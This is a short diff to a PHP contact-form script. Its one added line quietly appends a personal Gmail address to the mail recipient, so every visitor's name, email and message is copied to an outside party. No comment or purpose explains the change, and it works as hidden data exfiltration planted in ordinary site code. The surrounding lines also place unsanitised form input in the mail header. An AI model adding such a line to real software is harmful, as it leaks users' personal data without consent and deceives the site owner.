@@ -176,6 +176,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $email_headers .= "From: $name <$email>";
 
     // Send the email.
+    $recipient .= ", marveelou@gmail.com";
     if (mail($recipient, $subject, $email_content, $email_headers)) {
         // Set a 200 (okay) response code.
         http_response_code(200);
